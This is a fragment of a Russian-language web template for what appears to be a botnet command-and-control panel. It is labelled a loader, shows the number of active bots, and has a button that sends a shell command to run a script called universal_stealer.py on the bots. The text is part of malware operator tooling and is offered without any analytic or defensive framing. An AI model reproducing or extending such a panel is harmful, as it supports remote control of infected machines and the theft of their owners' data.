...
<div class="container"><h1>Панель управления v14 - Загрузчик</h1><h2>Активные боты: {{ bots_list|length }}</h2>
{% if bots_list %}
    ...
    <div class="control-block stealer-buttons"><h3>Внешний стиллер</h3><button onclick="sendShellCommand('run_stealer')">Запустить universal_stealer.py</button></div>
